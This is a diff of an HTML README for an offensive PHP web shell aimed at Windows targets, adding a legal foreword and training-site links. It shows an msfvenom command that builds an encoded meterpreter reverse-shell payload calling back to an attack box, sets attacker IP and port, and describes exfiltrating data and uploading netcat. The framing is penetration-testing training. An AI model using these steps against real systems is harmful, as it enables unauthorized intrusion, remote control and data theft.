@@ -1,6 +1,13 @@
 <h1> The Not-So Simple PHP Command Shell</h1>
 <img src="/img/nsscmdshell.png" />
-<p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:<br> 
+<h2>Foreword:</h2>
+<blockquote>Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. The following websites provide training resources and practice scenarios and are excellent resources for learning such skills:
+		<ul>
+			<li>https://www.hackthebox.eu/</li>
+			<li>https://tryhackme.com/</li>
+	    </ul>
+		  </blockquote>
+<p>Automates or simplifies many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:<br> 
 venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe</code>
 </p>
 
@@ -21,7 +28,7 @@ venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACK
 <code>$attackip = "10.0.2.6";</code><br>
 <code>$attackport = "8000";</code>
 
-<p>Next, upload the nsscmdshell.php file to the target. Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. </p>
+<p>Now get "nsscmdshell.php" onto the target < - DISCLAIMER (in a manner consistent with applicable laws - and within scope of a written contract where required) - >.</p>
 
 <p>Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.</p>
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png" />
